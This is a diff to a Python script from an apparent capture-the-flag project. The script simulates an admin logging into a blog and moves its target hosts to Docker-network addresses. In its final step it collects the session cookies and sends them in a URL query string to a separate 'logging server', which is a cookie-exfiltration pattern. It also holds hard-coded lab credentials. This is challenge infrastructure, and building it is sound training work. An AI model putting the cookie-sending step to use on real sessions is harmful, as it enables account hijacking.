@@ -3,7 +3,7 @@ import time
 
 def simulate_admin_login():
     # Base URL
-    base_url = 'http://127.0.0.1/MyPrjcts/GotTheEvidence/CTF/Code/login/'
+    base_url = 'http://172.22.0.3/'
 
     # Headers
     headers = {
@@ -12,7 +12,7 @@ def simulate_admin_login():
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'http://127.0.0.1',
+        'Origin': 'http://172.22.0.3',
         'Connection': 'close',
         'Upgrade-Insecure-Requests': '1',
         'Sec-Fetch-Dest': 'document',
@@ -24,7 +24,7 @@ def simulate_admin_login():
 
     # Initial login request
     login_data = {
-        'mail': 'admin@umbrella.com',
+        'mail': 'davidgrey@umbrella.com',
         'password': 'umb',
         'SignIn': 'Login Now'
     }
@@ -43,14 +43,14 @@ def simulate_admin_login():
     print('Second authentication response:', response.status_code)
 
     # Request to access the blog post page
-    blog_url = 'http://127.0.0.1/MyPrjcts/GotTheEvidence/CTF/Code/blog/post.php'
+    blog_url = 'http://172.22.0.3/post.php'
     response = session.get(blog_url, headers=headers)
     print('Blog post page response:', response.status_code)
 
     # Send the cookies to the logging server
     cookies = session.cookies.get_dict()
     cookie_str = '; '.join([f'{name}={value}' for name, value in cookies.items()])
-    log_url = f'http://127.0.0.1:5000/log?cookie={cookie_str}'
+    log_url = f'http://172.22.0.1:5000/log?cookie={cookie_str}'
     log_response = requests.get(log_url)
     print('Log response:', log_response.status_code)
 
